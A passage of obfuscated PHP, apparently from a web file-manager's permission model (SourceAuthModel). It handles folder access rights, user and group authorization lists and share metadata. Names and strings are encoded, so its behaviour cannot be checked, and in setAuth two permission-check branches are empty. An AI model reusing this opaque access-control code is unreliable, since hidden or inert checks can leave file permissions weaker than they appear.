($Ğ¢˜•Å[$ß¹º’ˆ¾[746]] == $ß¹º’ˆ¾[437]) { if ($€×ˆŸû†[$ß¹º’ˆ¾[468]] != $ß¹º’ˆ¾[198] && $this->shareFileMeta($€×ˆŸû†[$ß¹º’ˆ¾[468]])) { $this->shareFileMeta($€×ˆŸû†[$ß¹º’ˆ¾[468]], 0); } $this->remove($€×ˆŸû†[$ß¹º’ˆ¾[593]]); return !0; } if ($¾”×•õµ && $Ğ¢˜•Å[$ß¹º’ˆ¾[746]] == $ß¹º’ˆ¾[2026]) { $³•¹İõ® = $Ìá×¡ƒ[$ß¹º’ˆ¾[746]] == $ß¹º’ˆ¾[2026] ? 1 : 0; $this->shareFileMeta($€×ˆŸû†[$ß¹º’ˆ¾[468]], $³•¹İõ®); $this->removeByFile($€×ˆŸû†[$ß¹º’ˆ¾[468]]); } return $¾”×•õµ; } private function removeByFile($£°ï£Ô) { $š³Ğ¨Ñ¿ =& $_SERVER[­á Ş³Ö]; $İíã‹Á” = Model($š³Ğ¨Ñ¿[822])->where(array($š³Ğ¨Ñ¿[468] => $£°ï£Ô))->field($š³Ğ¨Ñ¿[402])->select(); $òÙ­¾Ş÷ = array_to_keyvalue($İíã‹Á”, $š³Ğ¨Ñ¿[12], $š³Ğ¨Ñ¿[402]); $ÉÇŸ–À“ = array($š³Ğ¨Ñ¿[402] => array($š³Ğ¨Ñ¿[7], $òÙ­¾Ş÷), $š³Ğ¨Ñ¿[488] => 1); $İíã‹Á” = $this->where($ÉÇŸ–À“)->field($š³Ğ¨Ñ¿[593])->select(); if (empty($İíã‹Á”)) { return; } $Á—Ò×ø = array_to_keyvalue($İíã‹Á”, $š³Ğ¨Ñ¿[12], $š³Ğ¨Ñ¿[593]); $this->remove($Á—Ò×ø); } private function shareFileMeta($“Ä¹¡, $¾Ğô‡”Î = null) { $ğ¤¹ñØ§ =& $_SERVER[­á Ş³Ö]; $®¤˜Ã½÷ = array($ğ¤¹ñØ§[468] => $“Ä¹¡, $ğ¤¹ñØ§[94] => $ğ¤¹ñØ§[2031]); if (is_null($¾Ğô‡”Î)) { return Model($ğ¤¹ñØ§[2032])->where($®¤˜Ã½÷)->find(); } $®¤˜Ã½÷[$ğ¤¹ñØ§[374]] = $¾Ğô‡”Î; Model($ğ¤¹ñØ§[2032])->add($®¤˜Ã½÷, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65\137\141\x75\x74\150"; public function getAuth($ëŞº¹ïÚ) { $ûŸöÛ‰í =& $_SERVER[­á Ş³Ö]; $€Ì÷ğ¨ï = $this->sourceAuthSelect($ëŞº¹ïÚ); $ËÚË•Î÷ = array(); $®Æ“–Ë = array(); $‹ÖÏ€„Ä = 2 << 25; foreach ($€Ì÷ğ¨ï as $Ê“çÂÆù) { $Ş¹ŞŒ• = Model($ûŸöÛ‰í[498])->listData($Ê“çÂÆù[$ûŸöÛ‰í[1956]]); if (!$Ş¹ŞŒ•) { continue; } $ËÚË•Î÷[] = $Ê“çÂÆù; $¨”€ˆÎø = 0; if ($Ê“çÂÆù[$ûŸöÛ‰í[411]] == SourceModel::TYPE_GROUP) { $¨”€ˆÎø = $‹ÖÏ€„Ä * 2; } if ($Ê“çÂÆù[$ûŸöÛ‰í[411]] == SourceModel::TYPE_USER) { $¨”€ˆÎø = $‹ÖÏ€„Ä; } if ($Ê“çÂÆù[$ûŸöÛ‰í[411]] == SourceModel::TYPE_USER && $Ê“çÂÆù[$ûŸöÛ‰í[496]] == $ûŸöÛ‰í[198]) { $¨”€ˆÎø = 0; } $®Æ“–Ë[] = $Ş¹ŞŒ•[$ûŸöÛ‰í[413]] + $¨”€ˆÎø; } array_multisort($®Æ“–Ë, SORT_DESC, $ËÚË•Î÷); return $ËÚË•Î÷; } public function sourceAuthSelect($‘ıöø…¡) { $øİëÙ«İ =& $_SERVER[­á Ş³Ö]; static $ºªÌµ¡Ğ = array(); $öÖ¹³Íƒ = is_array($‘ıöø…¡) ? !1 : !0; if ($öÖ¹³Íƒ) { $‘ıöø…¡ = array($‘ıöø…¡); } $ú´˜¾È· = array(); foreach ($‘ıöø…¡ as $Æ‘Œ§À) { if (isset($ºªÌµ¡Ğ[$Æ‘Œ§À])) { $ú´˜¾È·[$Æ‘Œ§À] = $ºªÌµ¡Ğ[$Æ‘Œ§À]; } } if (count($ú´˜¾È·) == count($‘ıöø…¡)) { return $öÖ¹³Íƒ ? $ú´˜¾È·[$‘ıöø…¡[0]] : $ú´˜¾È·; } $‹±ÖÅšÚ = $øİëÙ«İ[2033]; $£Äˆ•ÒÚ = array($øİëÙ«İ[402] => array($øİëÙ«İ[7], $‘ıöø…¡)); $ôŒÈƒ¤Ù = $this->field($‹±ÖÅšÚ)->order($øİëÙ«İ[399])->where($£Äˆ•ÒÚ)->select(); $»Õ»â›Œ = array_to_keyvalue_group($ôŒÈƒ¤Ù, $øİëÙ«İ[402]); foreach ($‘ıöø…¡ as $Æ‘Œ§À) { $ºªÌµ¡Ğ[$Æ‘Œ§À] = $»Õ»â›Œ[$Æ‘Œ§À] ? $»Õ»â›Œ[$Æ‘Œ§À] : array(); } if ($öÖ¹³Íƒ) { return $ôŒÈƒ¤Ù; } return $»Õ»â›Œ; } public function setAuth($œ±±­í˜, $•…µ±²) { $Æ¥àÒë˜ =& $_SERVER[­á Ş³Ö]; $å’’ˆ‘ø = Model($Æ¥àÒë˜[1335])->sourceInfo($œ±±­í˜); if (!$å’’ˆ‘ø) { return !1; } if ($å’’ˆ‘ø[$Æ¥àÒë˜[411]] != SourceModel::TYPE_GROUP) { return !1; } $£‘á¾ší = 1; $ùìÆëñà = $å’’ˆ‘ø[$Æ¥àÒë˜[496]]; if ($ùìÆëñà != $£‘á¾ší) { $çŸşô = array($Æ¥àÒë˜[1852] => $ùìÆëñà); $ÒÅó¡Ê = Model($Æ¥àÒë˜[1942])->field($Æ¥àÒë˜[1663])->where($çŸşô)->select(); $ÒÅó¡Ê = array_to_keyvalue($ÒÅó¡Ê, $Æ¥àÒë˜[12], $Æ¥àÒë˜[1663]); } $«‹¤İ—ï = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $”ïÈŸÈŠ = array(); foreach ($•…µ±² as $ô„¼á÷Â) { if (!in_array($ô„¼á÷Â[$Æ¥àÒë˜[411]], $«‹¤İ—ï)) { show_json(LNG($Æ¥àÒë˜[2034]), !1); } if ($ùìÆëñà != $£‘á¾ší) { if ($ô„¼á÷Â[$Æ¥àÒë˜[411]] == SourceModel::TYPE_GROUP) { } if ($ô„¼á÷Â[$Æ¥àÒë˜[496]] != 0 && !in_array($ô„¼á÷Â[$Æ¥àÒë˜[496]], $ÒÅó¡Ê)) { } } if ($ô„¼á÷Â[$Æ¥àÒë˜[496]] == 0) { $ô„¼á÷Â[$Æ¥àÒë˜[411]] = SourceModel::TYPE_USER; } $”ïÈŸÈŠ[] = array($Æ¥àÒë˜[402] => $œ±±­í˜, $Æ¥àÒë˜[411] => intval($ô„¼á÷Â[$Æ¥àÒë˜[411]]), $Æ¥àÒë˜[496] => intval($ô„¼á÷Â[$Æ¥àÒë˜[496]]), $Æ¥àÒë˜[1956] => intval($ô„¼á÷Â[$Æ¥àÒë˜[1956]]) ? intval($ô„¼á÷Â[$Æ¥àÒë˜[1956]]) : 0, $Æ¥àÒë˜[2016] => intval($ô„¼á÷Â[$Æ¥àÒë˜[2016]]) ? intval($ô„¼á÷Â[$Æ¥àÒë˜[2016]]) : -1); } $this->where(array($Æ¥àÒë˜[417] => $œ±±­í˜))->delete(); $this->addAll($”ïÈŸÈŠ); return !0; } public function authClear($ÓÆ‡×¸º) { $Ôı¹‘«¥ =& $_SERVER[­á Ş³Ö]; $ƒ®ºîøú = Model($Ôı¹‘«¥[1335])->sourceInfo($ÓÆ‡×¸º); $à½¬¬šÀ = array($ÓÆ‡×¸º); if ($ƒ®ºîøú[$Ôı¹‘«¥[410]] == $Ôı¹‘«¥[88]) { $¶±£ˆáş = array($Ôı¹‘«¥[580] => array($Ôı¹‘«¥[540], $ƒ®ºîøú[$Ôı¹‘«¥[511]] . $ÓÆ‡×¸º . $Ôı¹‘«¥[541])); $à½¬¬šÀ = Model($Ôı¹‘«¥[1335])->field($Ôı¹‘«¥[417])->where($¶±£ˆáş)->getField($Ôı¹‘«¥[402], !0); $à½¬¬šÀ[] = $ÓÆ‡×¸º; } $this->where(array($Ôı¹‘«¥[417] => array($Ôı¹‘«¥[418], $à½¬¬šÀ)))->delete(); return !0; } public function getAllChildren($Ì©ß‰ùº) { $ƒ†ÇÏ¨õ =& $_SERVER[­á Ş³Ö]; $‘­ÈØ› = Model($ƒ†ÇÏ¨õ[1335])->sourceInfo($Ì©ß‰ùº); if ($‘­ÈØ›[$ƒ†ÇÏ¨õ[410]] != $ƒ†ÇÏ¨õ[88]) { return $this->sourceListAuth(array($Ì©ß‰ùº)); } if ($‘­ÈØ›[$ƒ†ÇÏ¨õ[411]] != SourceModel::TYPE_GROUP) { return array(); } $÷à€ç•÷ = 1; $º¨—öõÁ = array($Ì©ß‰ùº); if ($‘­ÈØ›[$ƒ†ÇÏ¨õ[432]] == $ƒ†ÇÏ¨õ[198] && $‘­ÈØ›[$ƒ†ÇÏ¨õ[496]] != $÷à€ç•÷) { $º¨—öõÁ = $this->groupChidldAllRootSource($‘­ÈØ›[$ƒ†ÇÏ¨õ[496]]); } $÷ó‹©Ò¯ = $this->field($ƒ†ÇÏ¨õ[402])->group($ƒ†ÇÏ¨õ[402])->select(); $÷ó‹©Ò¯ = array_to_keyvalue($÷ó‹©Ò¯, $ƒ†ÇÏ¨õ[12], $ƒ†ÇÏ¨õ[402]); if (!$÷ó‹©Ò¯) { return array(); } $ë¶ë–ãĞ = $ƒ†ÇÏ¨õ[2035]; $‘€˜¢ñØ = array($ƒ†ÇÏ¨õ[402] => array($ƒ†ÇÏ¨õ[7], $÷ó‹©Ò¯), $ƒ†ÇÏ¨õ[431] => $ƒ†ÇÏ¨õ[198]); $ËÓö®úˆ = Model($ƒ†ÇÏ¨õ[822])->field($ë¶ë–ãĞ)->where($‘€˜¢ñØ)->select(); $â˜ÒîÒ = array($Ì©ß‰ùº); foreach ($ËÓö®úˆ as $ÜòæŸ¯İ) { foreach ($º¨—öõÁ as $©ù¥ò–‰) { $Ê·ó›†ë = $ƒ†ÇÏ¨õ[50] . $©ù¥ò–‰ . $ƒ†ÇÏ¨õ[50]; $‰¦Ê­Äù = $ÜòæŸ¯İ[$ƒ†ÇÏ¨õ[511]] . $ÜòæŸ¯İ[$ƒ†ÇÏ¨õ[402]] . $ƒ†ÇÏ¨õ[50]; if (strstr($‰¦Ê­Äù, $Ê·ó›†ë)) { $â˜ÒîÒ[] = $ÜòæŸ¯İ[$ƒ†ÇÏ¨õ[402]]; break; } } } return $this->sourceListAuth($â˜ÒîÒ); } private function sourceListAuth($Û±ÌŸ¹È) { $ÁÓªÄ»± =& $_SERVER[­á Ş³Ö]; $’¨×§÷ = Model($ÁÓªÄ»±[1335])->sourceListInfo($Û±ÌŸ¹È, !0); $—®èÁ˜Œ = $this->sourceAuthSelect($Û±ÌŸ¹È); $Ã•îôÙÑ = array(); $â¦˜¼³¢ = array(); foreach ($’¨×§÷ as $ÖÍ¢´î¬) { unset($ÖÍ¢´î¬[$ÁÓªÄ»±[456]]); unset($ÖÍ¢´î¬[$ÁÓªÄ»±[454]]); unset($ÖÍ¢´î¬[$ÁÓªÄ»±[413]]); unset($ÖÍ¢´î¬[$ÁÓªÄ»±[87]]); $Å–ìï§¦ = $—®èÁ˜Œ[$ÖÍ¢´î¬[$ÁÓªÄ»±[402]]]; if (!$Å–ìï§¦) { continue; } $ÖÍ¢´î¬[$ÁÓªÄ»±[2036]] = $this->authTargetInfo($Å–ìï§¦); $ÖÍ¢´î¬[$ÁÓªÄ»±[509]] = rtrim($ÖÍ¢´î¬[$ÁÓªÄ»±[515]], $ÁÓªÄ»±[8]) . $ÁÓªÄ»±[8] . ltrim($ÖÍ¢´î¬[$ÁÓªÄ»±[509]], $ÁÓªÄ»±[8]); $Ã•îôÙÑ[] = $ÖÍ¢´î¬; $ÉÄè©¡± = count(explode($ÁÓªÄ»±[8], trim($ÖÍ¢´î¬[$ÁÓªÄ»±[509]], $ÁÓªÄ»±[8]))); $â¦˜¼³¢[] = $ÉÄè©¡± + ($ÖÍ¢´î¬[$ÁÓªÄ»±[33]] == $ÁÓªÄ»±[75] ? 0 : 1000); } array_multisort($â¦˜¼³¢, SORT_ASC, $Ã•îôÙÑ); return $Ã•îôÙÑ; } private function groupChidldAllRootSource($»‹Ò¸Éç) { $Ğâ§¢ =& $_SERVER[­á Ş³Ö]; $§ØÙÜ© = Model($Ğâ§¢[2037])->groupChildrenAll($»‹Ò¸Éç); $ğùöŞİ = array($Ğâ§¢[432] => 0, $Ğâ§¢[496] => array($Ğâ§¢[7], $§ØÙÜ©), $Ğâ§¢[411] => SourceModel::TYPE_GROUP); $ì§Ò¬„Î = Model($Ğâ§¢[822])->field($Ğâ§¢[402])->where($ğùöŞİ)->select(); $ì§Ò¬„Î = array_to_keyvalue($ì§Ò¬„Î, $Ğâ§¢[12], $Ğâ§¢[402]); return $ì§Ò¬„Î; } private function authTargetInfo($ğæö§–) { $‰âä±ÖØ =& $_SERVER[­á Ş³Ö]; $„•ñÀäİ = array(); $Şš…¶Á = array(); $™¿ĞàÚÆ = 2 << 25; foreach ($ğæö§– as $ı“ğó–Ò) { $¾‹´ü‡Õ = Model($‰âä±ÖØ[498])->listData($ı“ğó–Ò[$‰âä±ÖØ[1956]]); if (!$¾‹´ü‡Õ) { continue; } if ($ı“ğó–Ò[$‰âä±ÖØ[411]] == SourceModel::TYPE_USER) { $çëğ—‚õ = Model($‰âä±ÖØ[504])->getInfoSimpleOuter($ı“ğó–Ò[$‰âä±ÖØ[496]]); if ($çëğ—‚õ[$‰âä±ÖØ[1663]] == $‰âä±ÖØ[1184]) { continue; } if ($çëğ—‚õ[$‰âä±ÖØ[1663]] == $‰âä±ÖØ[198]) { $çëğ—‚õ[$‰âä±ÖØ[32]] = LNG($‰âä±ÖØ[2038]); } } else { $çëğ—‚õ = Model($‰âä±ÖØ[512])->getInfoSimple($ı“ğó–Ò[$‰âä±ÖØ[496]]); } if (!$çëğ—‚õ) { continue; } $çëğ—‚õ[$‰âä±ÖØ[467]] = $¾‹´ü‡Õ; $„•ñÀäİ[] = $çëğ—‚õ; $²†ø›è = 0; if ($ı“ğó–Ò[$‰âä±ÖØ[411]] == SourceModel::TYPE_GROUP) { $²†ø›è = $™¿ĞàÚÆ * 2; } if ($ı“ğó–Ò[$‰âä±ÖØ[411]] == SourceModel::TYPE_USER) { $²†ø›è = $™¿ĞàÚÆ; } if ($ı“ğó–Ò[$‰âä±ÖØ[411]] == SourceModel::TYPE_USER && $ı“ğó–Ò[$‰âä±ÖØ[496]] == $‰âä±ÖØ[198]) { $²†ø›è = 0; } $Şš…¶Á[] = $¾‹´ü‡Õ[$‰âä±ÖØ[413]] + $²†ø›è; } array_multisort($Şš…¶Á, SORT_DESC, $„•ñÀäİ); return $„•ñÀäİ; } public function getAllChildrenByUser($¡˜šøÓ, $»¾İ©æò) { $ê“êÀ =& $_SERVER[­á Ş³Ö]; $Ë¹ô¨Øì = Model($ê“êÀ[525])->getInfo($»¾İ©æò); if (!$»¾İ©æò || !$¡˜šøÓ || !$Ë¹ô¨Øì) { return array(); } $±ÏÉ¥¹¯ = Model($ê“êÀ[1335])->sourceInfo($¡˜šøÓ); $éà›“Û = array(); $µÚŒÙ¥— = 1; if ($±ÏÉ¥¹¯[$ê“êÀ[432]] == $ê“êÀ[198] && $±ÏÉ¥¹¯[$ê“êÀ[496]] != $µÚŒÙ¥— && $this->groupContainUser($±ÏÉ¥¹¯[$ê“êÀ[496]], $»¾İ©æò)) { foreach ($Ë¹ô¨Øì[$ê“êÀ[2039]] as $²Óç±¶š) { $…•´ì¼ù = Model($ê“êÀ[512])->getInfo($²Óç±¶š[$ê“êÀ[1852]]); $‚°Êü•İ = Model($ê“êÀ[525])->getInfoSimpleOuter($»¾İ©æò); $‚°Êü•İ[$ê“êÀ[467]] = $²Óç±¶š[$ê“êÀ[413]]; if (Model($ê“êÀ[498])->authCheckAction($²Óç±¶š[$ê“êÀ[413]][$ê“êÀ[413]], $ê“êÀ[1873])) { continue; } $´Áô³‰ = array($ê“êÀ[32] => $ê“êÀ[1204] . $…•´ì¼ù[$ê“êÀ[32]], $ê“êÀ[402] => $…•´ì¼ù[$ê“êÀ[87]][$ê“êÀ[402]], $ê“êÀ[84] => KodIO::make($…•´ì¼ù[$ê“êÀ[87]][$ê“êÀ[402]]), $ê“êÀ[432] => $ê“êÀ[198], $ê“êÀ[411] => $ê“êÀ[505], $ê“êÀ[33] => $ê“êÀ[544], $ê“êÀ[509] => $…•´ì¼ù[$ê“êÀ[516]], $ê“êÀ[1852] => $…•´ì¼ù[$ê“êÀ[1852]], $ê“êÀ[513] => $…•´ì¼ù[$ê“êÀ[432]], $ê“êÀ[2036] => array($‚°Êü•İ)); $éà›“Û[$´Áô³‰[$ê“êÀ[402]]] = $´Áô³‰; } } $™´™øœ¾ = array(); $²Ğ‘ƒ˜Å = $this->getAllChildren($¡˜šøÓ); foreach ($²Ğ‘ƒ˜Å as $²ŸŸêáÂ) { $öûç¢¤ = !1; foreach ($²ŸŸêáÂ[$ê“êÀ[2036]] as $Ãşï«¿§) { if ($Ãşï«¿§[$ê“êÀ[1663]]) { if ($Ãşï«¿§[$ê“êÀ[1663]] == $»¾İ©æò) { $öûç¢¤ = !0; break; } } if ($Ãşï«¿§[$ê“êÀ[1852]]) { if ($this->groupContainUser($Ãşï«¿§[$ê“êÀ[1852]], $»¾İ©æò)) { $öûç¢¤ = !0; break; } } } if ($öûç¢¤) { $™´™øœ¾[] = $²ŸŸêáÂ; } $¥˜¾Â¾ = $²ŸŸêáÂ[$ê“êÀ[402]]; if (isset($éà›“Û[$¥˜¾Â¾])) { $²ŸŸêáÂ[$ê“êÀ[2036]][] = $éà›“Û[$¥˜¾Â¾][0]; $éà›“Û[$¥˜¾Â¾] = !1; } } $éà›“Û = array_filter(array_values($éà›“Û)); $™´™øœ¾ = array_merge($éà›“Û, $™´™øœ¾); return $™´™øœ¾; } public function setAllChildrenByUser($›ïŞÄ¶, $Ä¶ôŞßÏ, $¶ÔŸ±Í¸) { $ıÑ§ˆ‹û =& $_SERVER[­á Ş³Ö]; $ÆÅû”±î = $this->getAllChildrenByUser($›ïŞÄ¶, $Ä¶ôŞßÏ); if (!$¶ÔŸ±Í¸ || !$ÆÅû”±î) { return !1; } foreach ($ÆÅû”±î as $ƒÅûïä¿) { $™Ìº†õ = array(); foreach ($ƒÅûïä¿[$ıÑ§ˆ‹û[2036]] as $¯Œ£™ƒˆ) { $üŸº®¹ = $¯Œ£™ƒˆ[$ıÑ§ˆ‹û[467]]; $ƒİ¨­•  = $¯Œ£™ƒˆ[$ıÑ§ˆ‹û[1663]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¬ó”ï÷è = $¯Œ£™ƒˆ[$ıÑ§ˆ‹û[1663]] ? $¯Œ£™ƒˆ[$ıÑ§ˆ‹û[1663]] : $¯Œ£™ƒˆ[$ıÑ§ˆ‹û[1852]]; if ($¯Œ£™ƒˆ[$ıÑ§ˆ‹û[1663]] && $¯Œ£™ƒˆ[$ıÑ§ˆ‹û[1663]] == $Ä¶ôŞßÏ) { continue; } $™Ìº†õ[] = array($ıÑ§ˆ‹û[402] => $ƒÅûïä¿[$ıÑ§ˆ‹û[402]], $ıÑ§ˆ‹û[411] => $ƒİ¨­• , $ıÑ§ˆ‹û[496] => intval($¬ó”ï÷è), $ıÑ§ˆ‹û[1956] => isset($üŸº®¹[$ıÑ§ˆ‹û[399]]) ? intval($üŸº®¹[$ıÑ§ˆ‹û[399]]) : 0, $ıÑ§ˆ‹û[2016] => isset($üŸº®¹[$ıÑ§ˆ‹û[2016]]) ? intval($üŸº®¹[$ıÑ§ˆ‹û[2016]]) : -1); } $™Ìº†õ[] = array($ıÑ§ˆ‹û[402] => $ƒÅûïä¿[$ıÑ§ˆ‹û[402]], $ıÑ§ˆ‹û[411] => SourceModel::TYPE_USER, $ıÑ§ˆ‹û[496] => intval($Ä¶ôŞßÏ), $ıÑ§ˆ‹û[1956] => intval($¶ÔŸ±Í¸), $ıÑ§ˆ‹û[2016] => -1); $this->where(array($ıÑ§ˆ‹û[417] => $ƒÅûïä¿[$ıÑ§ˆ‹û[402]]))->delete(); $this->addAll($™Ìº†õ); } return !0; } public function get($öÒÈîÄá) { $ÆÛ¾ óÓ = $this->getSourceList(array($öÒÈîÄá), !0); return $ÆÛ¾ óÓ[0]; } public function getSourceList($õıÚ÷–—, $äîÛ£ô = false, $ùõòŸ—Ú = false) { $ˆÎÉÈöÁ =& $_SERVER[­á Ş³Ö]; if (!$õıÚ÷–—) { return array(); } $ÛŠ—–¸— = Model($ˆÎÉÈöÁ[1335]); if (!$äîÛ£ô && count($õıÚ÷–—) == 1) { $äîÛ£ô = array(); $äîÛ£ô[$õıÚ÷–—[0]] = $ÛŠ—–¸—->sourceInfo($õıÚ÷–—[0]); } if (!$äîÛ£ô) { $©ˆ£šë¼ = array($ˆÎÉÈöÁ[417] => array($ˆÎÉÈöÁ[418], $õıÚ÷–—)); $äîÛ£ô = $ÛŠ—–¸—->field($ˆÎÉÈöÁ[2040])->where($©ˆ£šë¼)->select(); $äîÛ£ô = array_to_keyvalue($äîÛ£ô, $ˆÎÉÈöÁ[402]); } $®íÛ®Ø´ = $õıÚ÷–—; foreach ($äîÛ£ô as $’÷ò¿ºÙ => $‘ú¯ûı¿) { $Ë÷¾ó¤Ö = $ÛŠ—–¸—->parentLevelArray($‘ú¯ûı¿[$ˆÎÉÈöÁ[511]]); $®íÛ®Ø´ = array_merge($®íÛ®Ø´, array($’÷ò¿ºÙ), array_reverse($Ë÷¾ó¤Ö)); } $®íÛ®Ø´ = array_values(array_unique($®íÛ®Ø´)); if (!$®íÛ®Ø´) { return array(); } $ó¾‚“ÑÏ = $this->sourceAuthSelect($®íÛ®Ø´); $¾« ŞôÏ = array(); foreach ($®íÛ®Ø´ as $ÕŸîÕÙ) { if (isset($ó¾‚“ÑÏ[$ÕŸîÕÙ])) { $¾« ŞôÏ[$ÕŸîÕÙ] = $ó¾‚“ÑÏ[$ÕŸîÕÙ]; } } $ıÒ¹Ò« = $this->userIsRoot($ùõòŸ—Ú); $Ç ¨Ó…ô = AuthModel::authAll(); $¶Î®¼¯ = array($ˆÎÉÈöÁ[414] => $Ç ¨Ó…ô, $ˆÎÉÈöÁ[2041] => array($ˆÎÉÈöÁ[419] => 0, $ˆÎÉÈöÁ[1858] => $Ç ¨Ó…ô, $ˆÎÉÈöÁ[420] => LNG($ˆÎÉÈöÁ[2042]), $ˆÎÉÈöÁ[1875] => $ˆÎÉÈöÁ[2043])); $İÜĞİõí = array(); foreach ($äîÛ£ô as $ÕŸîÕÙ => $¢¬É×ú£) { if ($ıÒ¹Ò« && $GLOBALS[$ˆÎÉÈöÁ[6]][$ˆÎÉÈöÁ[1871]]) { $İÜĞİõí[$ÕŸîÕÙ] = $¶Î®¼¯; continue; } $İÜĞİõí[$ÕŸîÕÙ] = $this->makeSourceAuth($¢¬É×ú£, $¾« ŞôÏ, $ùõòŸ—Ú); } return $İÜĞİõí; } public function authDeepCheck($Ğ¨Æ‘½ü, $¦¤Ã¸¨Á = false) { $ÎàøÏë =& $_SERVER[­á Ş³Ö]; $¦¤Ã¸¨Á = $¦¤Ã¸¨Á ? $¦¤Ã¸¨Á : USER_ID; $§±ğŸÏâ = $this->makeAuthDeep($¦¤Ã¸¨Á); if (!in_array($Ğ¨Æ‘½ü, $§±ğŸÏâ[$ÎàøÏë[2044]])) { return !1; } $Á˜ØÄõµ = array(); foreach ($§±ğŸÏâ[$ÎàøÏë[2045]] as $ñ„Ö´Ç° => $êâÅ—Äç) { if (!in_array($Ğ¨Æ‘½ü, $êâÅ—Äç)) { continue; } $Á˜ØÄõµ[] = $ñ„Ö´Ç°; } if (!$Á˜ØÄõµ) { return !1; } $§÷†¿™µ = $Á˜ØÄõµ ? $Á˜ØÄõµ[0] : $Ğ¨Æ‘½ü; return array($ÎàøÏë[414] => -1, $ÎàøÏë[467] => array($ÎàøÏë[419] => $ÎàøÏë[1184], $ÎàøÏë[1858] => $ÎàøÏë[198], $ÎàøÏë[420] => LNG($ÎàøÏë[2046]), $ÎàøÏë[1875] => $ÎàøÏë[2047]), $ÎàøÏë[2048] => LNG($ÎàøÏë[2049]), $ÎàøÏë[2050] => $this->sourceAuthInfo($§÷†¿™µ)); } protected function makeAuthDeep($·Ä­›’ = false) { $ª¾­Û¥® =& $_SERVER[­á Ş³Ö]; static $æÆÈ”ı· = array(); $·Ä­›’ = $·Ä­›’ ? $·Ä­›’ : USER_ID; if (isset($æÆÈ”ı·[$·Ä­›’])) { return $æÆÈ”ı·[$·Ä­›’]; } $ÍÄç‚»½ = Model($ª¾­Û¥®[2051])->listData(); $àõÅ»å = array(); foreach ($ÍÄç‚»½ as $éî¶–“í) { if ($éî¶–“í[$ª¾­Û¥®[413]] == 0 && $éî¶–“í[$ª¾­Û¥®[1874]] == $ª¾­Û¥®[88]) { $àõÅ»å[] = $éî¶–“í[$ª¾­Û¥®[399]]; } } $óÖ±‹ÚĞ = $this->userGroupParents($·Ä­›’); $Ø¾ = array($ª¾­Û¥®[411] => SourceModel::TYPE_USER, $ª¾­Û¥®[496] => $·Ä­›’); if ($óÖ±‹ÚĞ) { $Ø¾ = array(array($ª¾­Û¥®[411] => SourceModel::TYPE_USER, $ª¾­Û¥®[496] => $·Ä­›’), array($ª¾­Û¥®[411] => SourceModel::TYPE_GROUP, $ª¾­Û¥®[496] => array($ª¾­Û¥®[418], $óÖ±‹ÚĞ)), $ª¾­Û¥®[996] => $ª¾­Û¥®[1950]); } $¯íº¯¦Ñ = $this->field($ª¾­Û¥®[2052])->where($Ø¾)->select(); $›Õøïş = array(); $ªç‡¹• = array_to_keyvalue_group($¯íº¯¦Ñ, $ª¾­Û¥®[402]); foreach ($ªç‡¹• as $ù§£‰˜— => $ÉÂÛç ) { $Ú‚‚†İ€ = $this->authArrayCheck($ÉÂÛç , $·Ä­›’); if ($Ú‚‚†İ€[$ª¾­Û¥®[414]] > 0) { $›Õøïş[] = $ù§£‰˜— . $ª¾­Û¥®[12]; } } if ($óÖ±‹ÚĞ) { $¯ÎÚËã¯ = Model($ª¾­Û¥®[512]); foreach ($óÖ±‹ÚĞ as $²‘¸Ú¸–) { $Òïóª¬ó = $¯ÎÚËã¯->getInfo($²‘¸Ú¸–); if (!$Òïóª¬ó || !is_array($Òïóª¬ó[$ª¾­Û¥®[87]])) { continue; } $›Õøïş[] = $Òïóª¬ó[$ª¾­Û¥®[87]][$ª¾­Û¥®[402]]; } } $¼ÏÂìŒ = array(); $çå“ÅÕ = $óÖ±‹ÚĞ; $à‚‘ÒŞ„ = Model($ª¾­Û¥®[1335]); $¯ÎÚËã¯ = Model($ª¾­Û¥®[512]); $ˆœùÓÒ½ = array(); $¥ŞÃ¾íÃ = array(); $íå¾ºñ¿ = array(); $ÈÚØ˜†Å = array(); if ($›Õøïş) { $ •İ‰¹ = $à‚‘ÒŞ„->where(array($ª¾­Û¥®[402] => array($ª¾­Û¥®[418], $›Õøïş)))->select(); foreach ($ •İ‰¹ as $›Øèá·«) { $•ÉıåÕŸ = $à‚‘ÒŞ„->parentLevelArray($›Øèá·«[$ª¾­Û¥®[511]]); $¼ÏÂìŒ = array_merge($¼ÏÂìŒ, $•ÉıåÕŸ); $çå“ÅÕ[] = $›Øèá·«[$ª¾­Û¥®[496]]; $ˆœùÓÒ½[$›Øèá·«[$ª¾­Û¥®[402]]] = $•ÉıåÕŸ; $¥ŞÃ¾íÃ[$›Øèá·«[$ª¾­Û¥®[402]]] = $›Øèá·«[$ª¾­Û¥®[496]]; } } $çå“ÅÕ = array_values(array_unique($çå“ÅÕ)); $ñ«¶ïÖ« = $çå“ÅÕ; foreach ($ñ«¶ïÖ« as $²‘¸Ú¸–) { $Òïóª¬ó = $¯ÎÚËã¯->getInfo($²‘¸Ú¸–); $•ÉıåÕŸ = $à‚‘ÒŞ„->parentLevelArray($Òïóª¬ó[$ª¾­Û¥®[511]]); $çå“ÅÕ = array_merge($çå“ÅÕ, $•ÉıåÕŸ); } $çå“ÅÕ = array_values(array_unique($çå“ÅÕ)); foreach ($çå“ÅÕ as $²‘¸Ú¸–) { $Òïóª¬ó = $¯ÎÚËã¯->getInfo($²‘¸Ú¸–); $¼ÏÂìŒ[] = $Òïóª¬ó[$ª¾­Û¥®[87]][$ª¾­Û¥®[402]]; $íå¾ºñ¿[$²‘¸Ú¸–] = $Òïóª¬ó[$ª¾­Û¥®[87]][$ª¾­Û¥®[402]]; $ÈÚØ˜†Å[$²‘¸Ú¸–] = $à‚‘ÒŞ„->parentLevelArray($Òïóª¬ó[$ª¾­Û¥®[511]]); } foreach ($ˆœùÓÒ½ as $üİËáŸ => $ÀÅï¥£º) { $Ö¸É¬˜ = $¥ŞÃ¾íÃ[$üİËáŸ]; if (!$Ö¸É¬˜ || !$íå¾ºñ¿[$Ö¸É¬˜]) { continue; } $ôÈºœœ¤ = array(); foreach ($ÈÚØ˜†Å[$Ö¸É¬˜] as $²‘¸Ú¸–) { $ôÈºœœ¤[] = $íå¾ºñ¿[$²‘¸Ú¸–]; } $ˆœùÓÒ½[$üİËáŸ] = array_merge($ôÈºœœ¤, $ÀÅï¥£º); } $¼ÏÂìŒ = array_values(array_unique($¼ÏÂìŒ)); $­úğ“ë = 